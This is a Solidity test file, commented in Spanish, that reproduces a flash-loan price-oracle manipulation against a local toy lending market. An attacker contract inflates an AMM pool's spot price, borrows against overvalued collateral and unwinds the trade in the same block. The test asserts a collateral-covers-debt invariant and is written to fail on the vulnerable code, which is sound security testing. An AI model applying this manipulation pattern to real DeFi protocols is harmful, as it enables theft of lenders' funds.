// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Token, Pool, Mercado} from "../src/Mercado.sol";

/// @dev El atacante es un contrato para que `msg.sender` sea siempre el mismo
///      sin recurrir a cheatcodes: este ataque no necesita ni un `prank`.
contract Actor {
    function comprar(Pool pool, uint256 cuanto) external returns (uint256) {
        return pool.comprarToken(cuanto);
    }

    function vender(Pool pool, uint256 cuanto) external returns (uint256) {
        return pool.venderToken(cuanto);
    }

    function depositar(Mercado mercado, uint256 cuanto) external {
        mercado.depositarColateral(cuanto);
    }

    function prestar(Mercado mercado, uint256 cuanto) external {
        mercado.prestar(cuanto);
    }

    function tapa(Mercado mercado) external view returns (uint256) {
        return mercado.tope(address(this));
    }

    function devolver(Token stable, address a, uint256 cuanto) external {
        stable.transferir(a, cuanto);
    }
}

/// INVARIANTE `colateral-cubre-la-deuda`:
///     deuda_emitida <= valor_del_colateral * precio_previo_al_ataque
///
/// El mercado puede valorar el colateral con lo que quiera, pero NO con un
/// precio que el propio deudor fijo dentro del mismo bloque. Esta prueba AFIRMA
/// el invariante: en la version vulnerable TIENE QUE FALLAR, y su rojo es la
/// capsula funcionando, no la suite rota.
contract PruebaAtaque {
    Token token;
    Token stable;
    Pool pool;
    Mercado mercado;
    Actor atacante;

    /// @dev Prestamo sin comision que se devuelve dentro del mismo bloque: el
    ///      ataque no exige capital propio, solo acceso a liquidez flash.
    uint256 constant CAPITAL_FLASH = 900_000e18;
    uint256 constant COLATERAL = 100e18;
    address constant PRESTAMISTA = address(0xB0B);

    function setUp() public {
        token = new Token();
        stable = new Token();
        pool = new Pool(token, stable);
        mercado = new Mercado(pool, stable);
        atacante = new Actor();

        token.acunar(address(this), 1_000e18);
        stable.acunar(address(this), 1_500_000e18);

        // pool: 1 000 token contra 1 000 000 stable -> precio spot 1 000
        pool.agregarLiquidez(1_000e18, 1_000_000e18);

        // reserva del mercado para prestar, y capital del prestamo flash
        mercado.fondear(500_000e18);
        stable.acunar(address(atacante), CAPITAL_FLASH);
    }

    function test_elPrecioDelMismoBloqueNoPuedeValorarElColateral() public {
        uint256 precioAntes = mercado.precio();

        // 1. el atacante compra token contra el pool: la reserva de token baja y
        //    el precio spot sube. No cambio el valor del token: cambio la reserva.
        uint256 comprados = atacante.comprar(pool, CAPITAL_FLASH);

        // 2. deposita una parte como colateral, ya valorada al precio que fijo el
        atacante.depositar(mercado, COLATERAL);

        // 3. pide prestado el maximo que ese colateral inflado permite
        uint256 prestado = atacante.tapa(mercado);
        atacante.prestar(mercado, prestado);

        // 4. devuelve al pool el token que no uso: recupera el capital del
        //    prestamo y deja el precio donde estaba, con la deuda ya emitida
        uint256 recuperado = atacante.vender(pool, comprados - COLATERAL);

        // 5. devuelve el prestamo flash: el ataque empieza y termina DENTRO del
        //    mismo bloque, sin capital propio y sin esperar a nadie
        atacante.devolver(stable, PRESTAMISTA, CAPITAL_FLASH);

        // el ataque se paga solo. La ida y vuelta por el pool cuesta dinero, y
        // el mercado presta de mas justo lo suficiente para cubrirla: ese
        // exceso es lo que el mercado pierde y el atacante gana.
        assert(prestado + recuperado >= CAPITAL_FLASH);

        uint256 valorAlPrecioPrevio = mercado.colateral(address(atacante)) * precioAntes / 1e18;

        // INVARIANTE: la deuda que el mercado emitio no puede exceder el valor
        // del colateral a un precio que el deudor no fijo. Aqui revierte: el
        // mercado presto contra un precio que el mismo atacante acababa de poner.
        require(
            mercado.deuda(address(atacante)) <= valorAlPrecioPrevio, "colateral-cubre-la-deuda"
        );
    }
}
